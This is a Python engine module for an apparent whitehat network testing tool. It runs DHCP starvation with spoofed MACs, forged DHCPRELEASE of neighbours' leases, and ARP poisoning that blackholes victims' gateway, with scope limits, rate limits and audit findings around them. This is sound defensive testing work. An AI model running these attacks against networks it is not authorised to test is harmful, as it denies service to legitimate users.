"""DhcpEngine — orchestrates senders + sniffer over the pure packet layer.

Every outbound frame funnels through `_send()`, the single chokepoint that enforces the
whitehat guarantees (scope + rate limit + dry-run). `core` never prints; it emits events.
"""

from __future__ import annotations

import threading
import time

from scapy.all import sendp  # module-level so tests can monkeypatch dhcpig.core.engine.sendp

from . import events as ev
from . import packets
from .events import EventBus
from .exceptions import ConfigError
from .fingerprint import extract_signature, resolve
from .fingerprint import from_mac as fingerprint_from_mac
from .models import (
    FAIL,
    INCONCLUSIVE,
    INFO,
    PASS,
    ControlOutcome,
    Finding,
    HostFingerprint,
    Lease,
    Mode,
    Neighbor,
    PoolEstimate,
    ServerInfo,
    SessionConfig,
)
from .safety import Cleanup, RateLimiter, ScopeGuard
from .sniffer import DhcpSniffer

# engine states. EXHAUSTED means the *server* stopped offering — it is never set because of
# anything we chose ourselves (there is no lease cap; the window is the only self-imposed
# bound, and it exists to protect the server's offer table, not to cap how much we take).
# HALTED means a defensive control fired mid-run: sending has stopped, but leases are kept and
# the post-controls still run so the report is complete (see DhcpEngine._trigger_halt()).
IDLE, RUNNING, HALTED, EXHAUSTED, STOPPING, DONE = (
    "IDLE",
    "RUNNING",
    "HALTED",
    "EXHAUSTED",
    "STOPPING",
    "DONE",
)


class DhcpEngine:
    def __init__(self, cfg: SessionConfig, bus: EventBus) -> None:
        self.cfg = cfg
        self.bus = bus
        self.scope = ScopeGuard(cfg.scope_cidrs)
        self.rate = RateLimiter(cfg.rate_limit_pps)
        self.cleanup = Cleanup()
        self.state = IDLE
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []
        self._sniffer: DhcpSniffer | None = None
        self._started = 0.0
        # counters
        self.discovers = 0
        self.offers = 0
        self.acks = 0
        self.naks = 0
        self.garps = 0
        self.releases = 0
        self.servers: dict[str, ServerInfo] = {}
        # control transactions (legitimate cycle from the real NIC MAC), pre and post run
        self.control_pre: ControlOutcome | None = None  # real NIC MAC (reachability/renewal)
        self.control_post: ControlOutcome | None = None
        self.control_pre_new: ControlOutcome | None = None  # fresh MAC (can a NEW client join?)
        self.control_post_new: ControlOutcome | None = None
        self.findings: list[Finding] = []
        self._control_lock = threading.Lock()
        self._control_xid: int | None = None
        self._control_offer = None
        self._control_ack = None
        self._control_nak = False
        self._control_offer_evt = threading.Event()
        self._control_ack_evt = threading.Event()
        # exhaustion detection: offers must have flowed and then stopped
        self._offers_seen_any = False
        self._last_offer_ts = 0.0
        self._silence_noticed = False
        self._finishing = threading.Event()
        # heartbeat thread; deliberately NOT in _threads (callers treat that list as "work in
        # progress" and would never see a destructive run finish if a forever-thread were in it)
        self._ticker: threading.Thread | None = None
        # correlate ARP-discovered neighbors with DHCP-observed fingerprints by MAC, so the
        # Neighbors table shows OS/Device regardless of which signal (ARP vs DHCP) arrives first
        self._neighbors_by_mac: dict[str, Neighbor] = {}
        self._fp_by_mac: dict[str, HostFingerprint] = {}
        # garp mode: who we are poisoning, the forged MACs we used, and who fought back
        self._garp_targets: set[str] = set()
        self._garp_bogus_macs: set[str] = set()
        self._garp_defenders: set[str] = set()
        # windowed handshake pipeline (exhaust): bounded in-flight DISCOVER/REQUEST transactions
        # rather than an open-loop packet flood. xid -> {mac, sent_at, state}.
        self._window = cfg.window_initial
        # half-rate ramp: a clean ACK only earns half a slot, so it takes two clean ACKs in a
        # row to actually grow the window by one -- ramps back up more cautiously after any
        # earlier throttling instead of snapping straight back to a full flood.
        self._window_growth_accum = 0.0
        self._inflight: dict[int, dict] = {}
        self._inflight_lock = threading.Lock()
        self.timeouts_seen = 0
        self._consecutive_timeouts = 0
        self._nak_timestamps: list[float] = []
        self._offered_ip_macs: dict[str, set[str]] = {}
        self._duplicate_offer_ips: set[str] = set()
        # halt-and-report: the first defensive-control signal wins. (signal, detail, leases_held)
        self._halt_signal: tuple[str, str, int] | None = None
        # pool-size estimate for the headroom number: learned from the first OFFER's subnet
        # (option 1), or an explicit --scope. self._baseline_neighbor_count is the ARP-sweep
        # count taken *before* exhausting, for the pre-run utilization finding — it must not be
        # confused with the live _neighbors_by_mac count, which the estimate/headroom uses.
        self._first_offer_ip: str | None = None
        self._first_offer_subnet: str | None = None
        self._baseline_neighbor_count = 0

    # ---------------------------------------------------------------- send chokepoint
    def _send(self, pkt, target_ip: str | None = None) -> bool:
        """Return True if the frame was sent (or would-be-sent under dry-run).

        Enforces scope (for targeted frames), rate limit, and dry-run in one place.
        """
        if target_ip is not None and not self.scope.allows(target_ip):
            self.bus.emit(ev.Skipped(ip=target_ip, reason="OUT OF SCOPE"))
            return False
        self.rate.acquire()
        if self.cfg.dry_run:
            return True  # build + account, but never touch the wire
        sendp(pkt, iface=self.cfg.interface, verbose=False)
        return True

    def _debug(self, message: str) -> None:
        self.bus.emit(ev.Debug(message=message))

    # ---------------------------------------------------------------- lifecycle
    def start(self) -> None:
        if self.cfg.mode is Mode.ACTIVE_SCAN and not self.cfg.scope_cidrs:
            raise ConfigError("active-scan requires --scope (the network range to sweep)")
        self._started = time.time()
        self.state = RUNNING
        c = self.cfg
        self._debug(
            f"start mode={c.mode.value} iface={c.interface} ipver={c.ip_version.value} "
            f"rate={c.rate_limit_pps}pps "
            f"dry_run={c.dry_run} spoof_eth_src={c.spoof_ethernet_src} "
            f"scope={c.scope_cidrs} restore_on_exit={c.restore_on_exit}"
        )
        if self.cfg.status_interval > 0:
            self._ticker = threading.Thread(
                target=self._status_ticker, name="dhcpig-status", daemon=True
            )
            self._ticker.start()
        runners = {
            Mode.EXHAUST: self._run_exhaust,
            Mode.SCAN: self._run_scan,
            Mode.ACTIVE_SCAN: self._run_active_scan,
            Mode.RELEASE_NEIGHBORS: self._run_release,
            Mode.GARP_DOS: self._run_garp,
        }
        runners[self.cfg.mode]()

    # ---------------------------------------------------------------- status heartbeat
    def _counters(self) -> dict:
        return {
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "releases": self.releases,
            "garps": self.garps,
        }

    def _status_ticker(self) -> None:
        """Emit a StatusTick every `status_interval` seconds until the run stops."""
        prev, prev_t = self._counters(), time.time()
        # Event.wait() returns True once _stop is set, so this doubles as the sleep and the exit
        while not self._stop.wait(self.cfg.status_interval):
            # link_down: a switch putting the port into err-disable is a defensive control
            # firing, not a glitch to retry through. Polled here rather than a dedicated thread.
            if self.cfg.mode is Mode.EXHAUST and not self.cfg.dry_run and self._halt_signal is None:
                from .netutils import link_is_up

                if link_is_up(self.cfg.interface) is False:
                    self._trigger_halt("link_down", f"carrier lost on {self.cfg.interface}")
            now = time.time()
            cur = self._counters()
            window = max(1e-6, now - prev_t)
            stats = {
                "state": self.state,
                "elapsed": round(now - self._started, 1) if self._started else 0.0,
                "window": round(window, 1),
                "servers": len(self.servers),
                "neighbors": len(self._neighbors_by_mac),
                **cur,
                **{f"d_{k}": cur[k] - prev[k] for k in cur},
                "discover_pps": round((cur["discovers"] - prev["discovers"]) / window, 1),
                "lease_pps": round((cur["leases"] - prev["leases"]) / window, 1),
                "since_last_offer": (
                    round(now - self._last_offer_ts, 1) if self._offers_seen_any else None
                ),
            }
            if self.cfg.mode is Mode.EXHAUST:
                stats["send_window"] = self._window
                stats["inflight"] = len(self._inflight)
                stats["timeouts"] = self.timeouts_seen
                est, headroom = self._pool_headroom()
                stats["pool_size"] = est.size
                stats["pool_source"] = est.source
                stats["headroom"] = headroom
            if self._halt_signal is not None:
                stats["halt_signal"] = self._halt_signal[0]
            self.bus.emit(ev.StatusTick(stats=stats))
            prev, prev_t = cur, now

    def stop(self) -> None:
        if self.state == DONE:
            return  # idempotent: the CLI's finally-block and the web layer may both call this
        self.state = STOPPING
        self._stop.set()
        for t in self._threads:
            t.join(timeout=3.0)
        # Post-run control runs BEFORE restore, while our leases are still held — that is what
        # makes "a real client can't get an address" a meaningful measurement. Not optional:
        # dry-run has no sniffer to receive the reply, which is the only thing that skips it.
        if self.cfg.mode is Mode.EXHAUST and self._sniffer is not None:
            self.control_post = self._control_transaction("post", client="self")
            # the leg that actually answers "is the pool drained?" — needs a fresh address
            self.control_post_new = self._control_transaction("post", client="new")
            denied = self.control_post_new
            if denied.attempted and not denied.success and self.acks > 0:
                self.state = EXHAUSTED
                self.bus.emit(
                    ev.PoolExhausted(
                        leases=self.acks,
                        elapsed=time.time() - self._started,
                        confirmed=True,
                    )
                )
        self._finalize_findings()
        if self._sniffer is not None:
            self._sniffer.stop()
        if self.cfg.restore_on_exit and self.cfg.mode is Mode.EXHAUST:
            self.restore()
        self.state = DONE
        self.bus.emit(ev.SessionEnded(report=self.status()))

    def _finish_in_background(self, reason: str) -> None:
        """A terminal condition was reached — finalize without waiting for the operator.

        Runs off-thread because stop() joins the worker threads, and the caller here *is* one
        of them. Without this the run would sit idle after the pool drained: senders dead, no
        post-control, no verdict, until someone pressed Stop.
        """
        if self._finishing.is_set():
            return
        self._finishing.set()
        self._debug(f"auto-finalizing: {reason}")
        threading.Thread(target=self.stop, name="dhcpig-finish", daemon=True).start()

    def restore(self) -> None:
        """Release exactly the leases we acquired."""
        pending = self.cleanup.pending()
        if pending:
            self._debug(f"restore: releasing {len(pending)} acquired lease(s)")
        for lease in pending:
            pkt = packets.build_release_v4(
                lease.mac, lease.ip, lease.server_ip, lease.xid, server_mac=lease.server_mac
            )
            self._send(pkt)  # releasing our own leases; not scope-gated
            lease.released = True
            self.releases += 1
            self.bus.emit(ev.LeaseReleased(lease=lease))

    def status(self) -> dict:
        out = {
            "state": self.state,
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "garps": self.garps,
            "releases": self.releases,
            "servers": len(self.servers),
            "elapsed": round(time.time() - self._started, 1) if self._started else 0.0,
            "control_pre": self.control_pre.success if self.control_pre else None,
            "control_post": self.control_post.success if self.control_post else None,
            "findings": len(self.findings),
            "send_window": self._window,
            "halted": self._halt_signal is not None,
            "halt_signal": self._halt_signal[0] if self._halt_signal else None,
        }
        if self.cfg.mode is Mode.EXHAUST:
            est, headroom = self._pool_headroom()
            out["pool_size"] = est.size
            out["pool_source"] = est.source
            out["pool_is_estimate"] = est.is_estimate
            out["pool_detail"] = est.detail
            out["headroom"] = headroom
            out["in_use_observed"] = len(self._neighbors_by_mac)
        return out

    # ---------------------------------------------------------------- helpers
    def _src_mac(self, client_mac: str) -> str:
        if self.cfg.spoof_ethernet_src:
            return client_mac
        from scapy.all import get_if_hwaddr

        try:
            return get_if_hwaddr(self.cfg.interface)
        except Exception:
            # dry-run / no real iface: nothing is sent, so a placeholder src is fine
            from .netutils import random_mac

            return random_mac()

    # ---------------------------------------------------------------- control transaction
    def _consume_control(self, pkt) -> bool:
        """Route a reply belonging to the in-flight control transaction. True if consumed."""
        from scapy.all import BOOTP

        with self._control_lock:
            xid = self._control_xid
        if xid is None or BOOTP not in pkt or pkt[BOOTP].xid != xid:
            return False
        if packets.is_offer(pkt):
            self._control_offer = pkt
            self._control_offer_evt.set()
            return True
        if packets.is_ack(pkt):
            self._control_ack = pkt
            self._control_ack_evt.set()
            return True
        if packets.is_nak(pkt):
            self._control_nak = True
            self._control_offer_evt.set()
            self._control_ack_evt.set()
            return True
        return False

    def _fresh_control_mac(self) -> str:
        """A never-seen, locally administered MAC for the 'new client' control leg.

        Deliberately NOT the de:ad:* prefix the exhaust clients use, so a filter keyed on our
        attack traffic doesn't catch the control too.
        """
        import random

        return "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))

    def _control_transaction(self, phase: str, client: str = "self") -> ControlOutcome:
        """One legitimate DHCP cycle (DISCOVER/OFFER/REQUEST/ACK/RELEASE), released immediately.

        Two client identities, because they answer different questions:
          * `self` — this machine's real NIC MAC. The server most likely already has a binding
            for it, so this is effectively a RENEWAL: it proves DHCP is reachable and we are on
            the right VLAN, but it can succeed even when the free pool is completely drained.
          * `new` — a MAC the server has never seen, which must come off the free list. This is
            the only leg that can show whether a *new* client can still obtain an address.
        """
        out = ControlOutcome(phase=phase, client=client)
        if self.cfg.dry_run:
            out.reason = "skipped (dry-run)"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out
        from scapy.all import DHCP

        try:
            if client == "new":
                mac = self._fresh_control_mac()
            else:
                from scapy.all import get_if_hwaddr

                mac = get_if_hwaddr(self.cfg.interface)
        except Exception as exc:
            out.reason = f"skipped (no hardware MAC: {exc!r})"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out

        out.attempted = True
        out.mac = mac
        self.bus.emit(ev.ControlStarted(phase=phase))
        started = time.time()
        xid = _rand_xid()
        with self._control_lock:
            self._control_xid = xid
            self._control_offer = None
            self._control_ack = None
            self._control_nak = False
        self._control_offer_evt.clear()
        self._control_ack_evt.clear()
        try:
            self._send(packets.build_discover_v4(mac, xid, mac))
            who = "real NIC MAC" if client == "self" else "fresh unseen MAC"
            self._debug(f"CONTROL[{phase}/{client}] DISCOVER xid=0x{xid:08x} chaddr={mac} ({who})")
            if not self._control_offer_evt.wait(self.cfg.timeouts.control):
                out.reason = "no OFFER within timeout"
                return out
            if self._control_nak:
                out.reason = "server replied NAK"
                return out
            offer = self._control_offer
            sid, server_mac, offered_ip, subnet = packets.parse_offer(offer)
            out.offered_ip, out.server_id, out.subnet = offered_ip, sid, subnet
            out.server_mac = server_mac or None
            self._note_offer_for_pool_estimate(offered_ip, subnet)
            lt = packets.dhcp_option(offer[DHCP].options, "lease_time")
            out.lease_time = int(lt) if isinstance(lt, int) else None
            self._debug(f"CONTROL[{phase}/{client}] OFFER {offered_ip} from {sid} subnet={subnet}")
            self._send(packets.build_request_v4(offer, mac))
            if not self._control_ack_evt.wait(self.cfg.timeouts.control):
                out.reason = f"OFFER {offered_ip} but no ACK within timeout"
                return out
            if self._control_nak:
                out.reason = f"OFFER {offered_ip} then NAK"
                return out
            out.success = True
            self._debug(
                f"CONTROL[{phase}/{client}] ACK {offered_ip} — this client can obtain a lease"
            )
            # give the address straight back; the control must not consume pool capacity
            self._send(packets.build_release_v4(mac, offered_ip, sid, xid, server_mac=server_mac))
            self._debug(f"CONTROL[{phase}/{client}] RELEASE {offered_ip}")
        except Exception as exc:  # a broken control must never kill the run
            out.reason = f"error: {exc!r}"
        finally:
            out.elapsed = round(time.time() - started, 2)
            with self._control_lock:
                self._control_xid = None
            self.bus.emit(ev.ControlFinished(outcome=out))
        return out

    # ---------------------------------------------------------------- findings
    def _raise(self, finding: Finding) -> None:
        self.findings.append(finding)
        self.bus.emit(ev.FindingRaised(finding=finding))

    def _finalize_findings(self) -> None:
        """Turn what we observed into auditable verdicts. Called once, at stop()."""
        if self.cfg.dry_run:
            return
        pre, post = self.control_pre, self.control_post
        distinct_macs = len({ln.mac for ln in self.cleanup.all()})
        elapsed = round(time.time() - self._started, 1) if self._started else 0.0

        # A failed baseline invalidates everything else — say so first and loudly.
        if pre is not None and pre.attempted and not pre.success:
            self._raise(
                Finding(
                    id="CONTROL_BASELINE_FAILED",
                    title="Baseline DHCP request from the real NIC MAC failed",
                    verdict=INCONCLUSIVE,
                    severity="high",
                    evidence={
                        "phase": "pre",
                        "reason": pre.reason,
                        "interface": self.cfg.interface,
                    },
                    recommendation=(
                        "Results are not conclusive. Confirm the interface is on the intended "
                        "VLAN with a reachable DHCP server before drawing any conclusion about "
                        "the network's defenses."
                    ),
                )
            )

        baseline_ok = pre is not None and pre.success
        # A new client blocked at baseline while our own MAC works is the signature of an L2
        # admission control (snooping / port security), not a broken test.
        if (
            baseline_ok
            and self.control_pre_new is not None
            and self.control_pre_new.attempted
            and not self.control_pre_new.success
        ):
            self._raise(
                Finding(
                    id="NEW_CLIENT_BLOCKED_AT_BASELINE",
                    title="An unknown MAC could not obtain an address even before testing",
                    verdict=PASS,
                    severity="info",
                    evidence={
                        "known_mac_ok": True,
                        "new_client_reason": self.control_pre_new.reason,
                    },
                    recommendation=(
                        "This machine's own MAC was served but an unseen MAC was not — "
                        "consistent with DHCP snooping or port security. Exhaustion cannot be "
                        "measured against this segment, which is itself the desired outcome."
                    ),
                )
            )
        if self.cfg.mode is Mode.EXHAUST and self._baseline_neighbor_count:
            est, _ = self._pool_headroom()
            if est.size:
                utilization = self._baseline_neighbor_count / est.size
                if utilization >= 0.8:
                    self._raise(
                        Finding(
                            id="POOL_HEADROOM_LOW",
                            title="The pool was already near full before this test began",
                            verdict=INFO,
                            severity="medium",
                            evidence={
                                "in_use_observed": self._baseline_neighbor_count,
                                "pool_size": est.size,
                                "source": est.source,
                                "utilization_pct": round(utilization * 100, 1),
                            },
                            recommendation=(
                                "A passive, pre-test finding independent of whether exhausting "
                                "the pool succeeded: with the scope already this full, only a "
                                "few more leases deny service to the next legitimate client. "
                                "Consider widening the scope or adding a second one."
                            ),
                        )
                    )

        if self.cfg.mode is Mode.EXHAUST:
            # Exhaustion is judged on the NEW-client leg. The self leg usually renews an
            # existing binding, so it can succeed against a completely drained pool.
            pre_new, post_new = self.control_pre_new, self.control_post_new
            new_baseline_ok = pre_new is not None and pre_new.success
            if post_new is not None and post_new.attempted:
                attained = self.acks > 0 and not post_new.success and new_baseline_ok
                # First reason that applies wins: an invalid or already-blocked baseline
                # explains a non-result before a mid-run control or remaining headroom does.
                if not baseline_ok:
                    reason = "inconclusive_baseline"
                elif not new_baseline_ok:
                    reason = "blocked_at_baseline"
                elif self._halt_signal is not None:
                    reason = "control_fired"
                else:
                    reason = "pool_headroom_remaining"

                if attained:
                    self._raise(
                        Finding(
                            id="DHCP_STARVATION_ATTAINED",
                            title="A new client was denied an address while spoofed leases "
                            "were held",
                            verdict=FAIL,
                            severity="high",
                            evidence={
                                "leases_held": self.acks,
                                "distinct_client_macs": distinct_macs,
                                "new_client_reason": post_new.reason,
                                "new_client_baseline_ip": (pre_new.offered_ip if pre_new else None),
                                "renewal_still_worked": bool(post and post.success),
                                "elapsed_sec": elapsed,
                                "servers": list(self.servers),
                            },
                            recommendation=(
                                "The pool was driven to the point of denying service to a "
                                "brand-new client. Rate-limit DHCP per port and enable DHCP "
                                "snooping / port security, then re-run to confirm."
                            ),
                        )
                    )
                else:
                    evidence: dict = {"reason": reason, "leases_held": self.acks}
                    if reason == "control_fired" and self._halt_signal is not None:
                        signal, detail, leases_at_halt = self._halt_signal
                        evidence.update(
                            {"signal": signal, "detail": detail, "leases_at_halt": leases_at_halt}
                        )
                        recommendation = (
                            f"Sending stopped on {signal} ({detail}) after {leases_at_halt} "
                            "lease(s) held — that control is what's providing protection here; "
                            "confirm it in switch/DHCP-server logs."
                        )
                    elif reason == "pool_headroom_remaining":
                        est, headroom = self._pool_headroom()
                        evidence.update(
                            {"headroom": headroom, "pool_size": est.size, "pool_source": est.source}
                        )
                        hr = headroom if headroom is not None else "an unknown amount of"
                        recommendation = (
                            f"A new client could still obtain an address, with ~{hr} address(es) "
                            "of headroom estimated remaining — the pool was not driven to "
                            "exhaustion within this run."
                        )
                    elif reason == "blocked_at_baseline":
                        recommendation = (
                            "An unknown MAC could not obtain an address even before the test "
                            "began — consistent with DHCP snooping or port security. See "
                            "NEW_CLIENT_BLOCKED_AT_BASELINE for the direct evidence."
                        )
                    else:  # inconclusive_baseline
                        recommendation = (
                            "The baseline request from this machine's real MAC failed, so "
                            "nothing here can be concluded. See CONTROL_BASELINE_FAILED."
                        )
                    self._raise(
                        Finding(
                            id="DHCP_STARVATION_NOT_ATTAINED",
                            title="A new client could still obtain an address after the run",
                            verdict=PASS,
                            severity="info",
                            evidence=evidence,
                            recommendation=recommendation,
                        )
                    )

                # offers stopped, yet a brand-new client is still served: that is the server
                # refusing our traffic specifically, not running out of addresses
                if post_new.success and self.state == EXHAUSTED:
                    self._raise(
                        Finding(
                            id="SERVER_STOPPED_SERVING_TEST_CLIENTS",
                            title="Server stopped answering the test clients while still "
                            "serving a new client",
                            verdict=INFO,
                            severity="medium",
                            evidence={
                                "leases_before_offers_ceased": self.acks,
                                "discovers": self.discovers,
                                "naks": self.naks,
                                "new_client_ip": post_new.offered_ip,
                            },
                            recommendation=(
                                "Consistent with DHCP rate-limiting, offer-table saturation "
                                "or anti-starvation protection rather than pool exhaustion. "
                                "A NAK burst just before offers ceased points at the server "
                                "re-offering already-pending addresses."
                            ),
                        )
                    )

        if self.cfg.mode is Mode.GARP_DOS and self.garps > 0:
            defended = sorted(self._garp_defenders)
            if defended:
                self._raise(
                    Finding(
                        id="ARP_FORGERIES_REACHED_TARGETS",
                        title="Forged ARP frames reached targets, which defended their addresses",
                        verdict=INFO,
                        severity="medium",
                        evidence={
                            "frames_sent": self.garps,
                            "targets": len(self._garp_targets),
                            "defended": defended,
                        },
                        recommendation=(
                            "Nothing dropped our forged ARP on the way in, so Dynamic ARP "
                            "Inspection is not filtering this port. Hosts defending their own "
                            "address does not mean their gateway entry survived — confirm on a "
                            "target with 'arp -a' / 'ip neigh' whether the gateway MAC is wrong."
                        ),
                    )
                )
            else:
                self._raise(
                    Finding(
                        id="ARP_FORGERIES_UNANSWERED",
                        title="Forged ARP frames drew no response from any target",
                        verdict=INCONCLUSIVE,
                        severity="medium",
                        evidence={
                            "frames_sent": self.garps,
                            "targets": len(self._garp_targets),
                        },
                        recommendation=(
                            "Either the frames were filtered (Dynamic ARP Inspection / port "
                            "security) or the targets simply accepted them silently — both look "
                            "identical from here. Check DAI drop counters on the switch, and "
                            "'arp -a' on a target, to tell them apart."
                        ),
                    )
                )

        if self.naks > 0:
            self._raise(
                Finding(
                    id="DHCP_NAK_OBSERVED",
                    title="Server actively refused requests (DHCPNAK)",
                    verdict=INFO,
                    severity="medium",
                    evidence={"naks": self.naks},
                    recommendation=(
                        "NAKs often indicate snooping binding-table enforcement or an address "
                        "conflict. Correlate with switch logs."
                    ),
                )
            )

        if len(self.servers) > 1:
            self._raise(
                Finding(
                    id="MULTIPLE_DHCP_SERVERS",
                    title="More than one DHCP server answered on this segment",
                    verdict=FAIL,
                    severity="high",
                    evidence={"servers": list(self.servers)},
                    recommendation=(
                        "Verify each server is authorized. An unexpected responder is a rogue "
                        "DHCP server; DHCP snooping with trusted uplink ports prevents this."
                    ),
                )
            )

    def _note_neighbor(self, mac: str, ip: str) -> Neighbor:
        """Record/refresh a neighbor, attaching any DHCP fingerprint already seen for this MAC.

        With no DHCP evidence we fall back to the MAC's OUI, so an ARP-only host still shows
        its hardware vendor rather than an empty OS/Device column.
        """
        fp = self._fp_by_mac.get(mac)
        if fp is None:
            fp = fingerprint_from_mac(mac, ip=ip, role="neighbor")
        n = Neighbor(mac=mac, ip=ip, fingerprint=fp)
        self._neighbors_by_mac[mac] = n
        self.bus.emit(ev.NeighborFound(neighbor=n))
        return n

    def _note_fingerprint(self, fp: HostFingerprint) -> None:
        """Record a resolved fingerprint by MAC; if that host is already a known neighbor
        (ARP arrived before/without DHCP), refresh its row so the Neighbors table picks it up."""
        if fp.confidence <= 0 or not fp.mac:
            return
        self._fp_by_mac[fp.mac] = fp
        existing = self._neighbors_by_mac.get(fp.mac)
        if existing is not None and (
            existing.fingerprint is None or fp.confidence > existing.fingerprint.confidence
        ):
            updated = Neighbor(mac=existing.mac, ip=existing.ip, fingerprint=fp)
            self._neighbors_by_mac[fp.mac] = updated
            self.bus.emit(ev.NeighborFound(neighbor=updated))

    def _do_release(
        self, neighbors: list[Neighbor], server_ip: str, server_mac: str | None = None
    ) -> int:
        """Send DHCPRELEASE for in-scope neighbors. Returns count sent. Unit-testable."""
        sent = 0
        for n in neighbors:
            if self._stop.is_set():
                break
            xid = _rand_xid()
            pkt = packets.build_release_v4(n.mac, n.ip, server_ip, xid, server_mac=server_mac)
            if self._send(pkt, target_ip=n.ip):
                sent += 1
                self.releases += 1
                self.bus.emit(
                    ev.LeaseReleased(
                        lease=Lease(
                            n.mac,
                            n.ip,
                            server_ip,
                            xid,
                            self.cfg.ip_version,
                            released=True,
                            server_mac=server_mac,
                        )
                    )
                )
        return sent

    def _do_garp(self, targets: list[Neighbor], gateway: str | None = None) -> int:
        """One poisoning round over `targets`. Returns frames sent. Unit-testable.

        Per target, up to three frames:
          1. broadcast GARP *request*  claiming the victim's own IP  (announcement form)
          2. broadcast GARP *reply*    claiming the victim's own IP  (unsolicited form)
          3. unicast ARP reply to the victim putting the GATEWAY at an unused MAC

        (3) is the one that actually costs the victim connectivity — (1) and (2) mostly trip
        duplicate-address detection, which well-behaved hosts simply defend against. The MAC
        used is always bogus, so the traffic is blackholed rather than intercepted.
        """
        from .netutils import random_mac

        sent = 0
        for n in targets:
            if self._stop.is_set():
                break
            bogus = random_mac()
            self._garp_bogus_macs.add(bogus)
            for op, label in ((packets.ARP_REQUEST, "request"), (packets.ARP_REPLY, "reply")):
                pkt = packets.build_garp(n.ip, bogus, op=op)
                if self._send(pkt, target_ip=n.ip):
                    sent += 1
                    self.garps += 1
                    self._debug(
                        f"GARP {label} (op={op}) broadcast: claiming {n.ip} is at {bogus} "
                        f"(real owner {n.mac or '?'})"
                    )
            if gateway and n.mac and n.ip != gateway:
                gw_bogus = random_mac()
                self._garp_bogus_macs.add(gw_bogus)
                pkt = packets.build_arp_poison(gateway, gw_bogus, n.ip, n.mac)
                if self._send(pkt, target_ip=n.ip):
                    sent += 1
                    self.garps += 1
                    self._debug(
                        f"ARP poison unicast -> {n.ip} ({n.mac}): gateway {gateway} is at "
                        f"{gw_bogus} (blackhole; victim's default route cut)"
                    )
            self.bus.emit(ev.GarpSent(ip=n.ip))
        return sent

    # ---------------------------------------------------------------- pool estimate / headroom
    def _note_offer_for_pool_estimate(self, offered_ip: str, subnet: str | None) -> None:
        """Remember the first OFFER's address+subnet, in case --scope was never given.

        Called from both the real sender path and the control transaction, so the estimate
        becomes available as soon as *any* OFFER is seen — usually the control/self leg, well
        before the exhaust sender sends its first packet.
        """
        if self._first_offer_ip is None and subnet:
            self._first_offer_ip, self._first_offer_subnet = offered_ip, subnet

    def _estimate_pool(self) -> PoolEstimate:
        """Best-effort pool size. Never fabricated — `size=None` when nothing is known yet.

        Resolution order: an explicit --scope (deterministic host count) beats inferring the
        subnet from an OFFER (option 1), which is itself only as good as what the server told
        us — reservations, exclusions, and additional scopes on the same segment are invisible
        from here.
        """
        import ipaddress

        if self.cfg.scope_cidrs:
            try:
                total = sum(
                    max(0, ipaddress.ip_network(c, strict=False).num_addresses - 2)
                    for c in self.cfg.scope_cidrs
                )
                return PoolEstimate(
                    size=total,
                    source="scope",
                    is_estimate=False,
                    detail=f"usable hosts in {', '.join(self.cfg.scope_cidrs)}",
                )
            except ValueError:
                pass
        if self._first_offer_ip and self._first_offer_subnet:
            from .netutils import cidr_from_mask

            try:
                prefixlen = cidr_from_mask(self._first_offer_subnet)
                net = ipaddress.ip_network(f"{self._first_offer_ip}/{prefixlen}", strict=False)
                return PoolEstimate(
                    size=max(0, net.num_addresses - 2),
                    source="observed",
                    is_estimate=True,
                    detail=f"subnet inferred from an OFFER ({net})",
                )
            except (ValueError, OSError):
                pass
        return PoolEstimate(
            size=None, source="none", is_estimate=True, detail="no --scope and no OFFER seen yet"
        )

    def _pool_headroom(self) -> tuple[PoolEstimate, int | None]:
        """(estimate, headroom). headroom is None whenever the estimate itself is unknown, and
        floored at 0 rather than allowed to go negative (over-subscribed/misestimated scopes)."""
        est = self._estimate_pool()
        if est.size is None:
            return est, None
        in_use_observed = len(self._neighbors_by_mac)
        headroom = max(0, est.size - self.acks - in_use_observed)
        return est, headroom

    # ---------------------------------------------------------------- windowed handshake pipeline
    def _trigger_halt(self, signal: str, detail: str) -> None:
        """First control signal wins: stop sending, keep leases, finish the report.

        This is the fix for the run that motivated this rewrite — flooding DISCOVERs kept
        piling up half-open allocations after the server had already started pushing back
        (NAKs, then silence), which looked like failure but was actually the tool refusing to
        stop. Detecting the signal and halting immediately, rather than trying to power
        through it, is what makes the eventual verdict trustworthy.
        """
        if self._halt_signal is not None:
            return
        self._halt_signal = (signal, detail, self.acks)
        self.state = HALTED
        self.bus.emit(ev.ControlDetected(signal=signal, detail=detail, leases_held=self.acks))
        self._debug(f"HALT[{signal}] {detail} — leases held: {self.acks}; sending stopped")
        self._finish_in_background(f"control detected: {signal} — {detail}")

    def _grow_window(self) -> None:
        """Grow at half the naive rate: each clean ACK only adds 0.5 to an accumulator, so it
        takes two clean ACKs to actually widen the window by one slot."""
        with self._inflight_lock:
            self._window_growth_accum += 0.5
            if self._window_growth_accum < 1.0:
                return
            self._window_growth_accum -= 1.0
            w = self._window = min(self.cfg.window_max, self._window + 1)
        self._debug(f"window -> {w} (clean ACK)")

    def _shrink_window(self, trigger: str) -> None:
        with self._inflight_lock:
            self._window_growth_accum = 0.0
            old = self._window
            w = self._window = max(1, self._window // 2)
        if w != old:
            self._debug(f"window {old} -> {w} ({trigger})")

    def _reap_timeouts(self) -> None:
        """Free in-flight slots that never got a reply. A timeout shrinks the window exactly
        like a NAK does — a half-open allocation that never completes is the same signal that
        the server (or the network) can't keep up, whichever end caused it."""
        now = time.time()
        limit = self.cfg.timeouts.dhcp_request
        with self._inflight_lock:
            expired = [xid for xid, info in self._inflight.items() if now - info["sent_at"] > limit]
            for xid in expired:
                del self._inflight[xid]
        if not expired:
            return
        self.timeouts_seen += len(expired)
        self._consecutive_timeouts += len(expired)
        self._shrink_window("timeout")
        self._debug(
            f"{len(expired)} handshake(s) timed out (no reply within {limit}s); "
            f"{self._consecutive_timeouts} consecutive"
        )
        if self._consecutive_timeouts >= 5:
            self._trigger_halt(
                "timeout_storm", f"{self._consecutive_timeouts} consecutive handshake timeouts"
            )

    def _note_nak_for_burst_detection(self) -> None:
        now = time.time()
        self._nak_timestamps.append(now)
        self._nak_timestamps = [t for t in self._nak_timestamps if now - t <= 5.0]
        if len(self._nak_timestamps) >= 3:
            self._trigger_halt("nak_burst", f"{len(self._nak_timestamps)} NAKs within 5s")

